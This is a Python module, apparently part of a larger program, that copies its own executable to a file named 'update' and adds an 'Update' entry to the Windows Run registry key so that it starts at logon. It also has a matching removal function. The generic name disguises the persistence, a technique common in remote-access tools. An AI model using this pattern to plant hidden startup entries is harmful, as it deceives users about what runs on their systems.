# Autorun module.


# Importing.

# Modules.
import shutil
import typing
import os.path

# Local modules.
import config
import utils


def register() -> typing.NoReturn:
    """
    Register self in autorun.
    :return: Not returns any.
    """

    if not config.AUTORUN_ENABLED:
        # If autorun is disabled in config.

        # Return.
        return

    if config.EXECUTABLE_EXTENSION == "py" and not config.AUTORUN_OVERRIDE_PY:
        # If this is python script file, not .exe and not enabled override in config.

        # Returning.
        return

    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError:
        # If there is ImportError.

        # Debug message.
        utils.debug_print("Error occurred, cannot register in autorun! Error when importing module winreg")

        # Returning.
        return

    try:
        # Trying to add to the autorun.

        # Getting executable path.
        _executable_path = config.EXECUTABLE_WORKING_DIRECTORY + "update." + config.EXECUTABLE_EXTENSION

        if not os.path.exists(_executable_path):
            # If no file there (We don't add this already).

            # Building path.
            utils.path_build(_executable_path)

            # Copying executable there.
            shutil.copyfile(config.EXECUTABLE_PATH, _executable_path)

        # Opening key.
        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                       reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Adding autorun.
        winreg.SetValueEx(_registry_key, "Update", 0, winreg.REG_SZ, _executable_path)

        # Closing key.
        winreg.CloseKey(_registry_key)
    except Exception as _exception: # noqa
        # If error occurred.

        # Debug message.
        utils.debug_exception(f"Cannot register in registry!", _exception)


def unregister() -> typing.NoReturn:
    """
    Unregister self from autorun.
    :return: Not returns any.
    """

    if not config.AUTORUN_ENABLED:
        # If autorun is disabled in config.

        # Return.
        return

    if config.EXECUTABLE_EXTENSION == "py" and not config.AUTORUN_OVERRIDE_PY:
        # If this is python script file, not .exe and not enabled override in config.

        # Returning.
        return

    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError as _exception:
        # If there is ImportError.

        # Debug message.
        utils.debug_exception("Cannot unregister from autorun", _exception)

        # Returning.
        return

    try:
        # Trying to remove autorun.

        # Opening key.
        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                       reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Deleting autorun.
        winreg.DeleteValue(_registry_key, "Update")

        # Closing key.
        winreg.CloseKey(_registry_key)
    except Exception as _exception:  # noqa
        # If error occurred.

        # Debug message.
        utils.debug_exception(f"Cannot unregister from autorun", _exception)
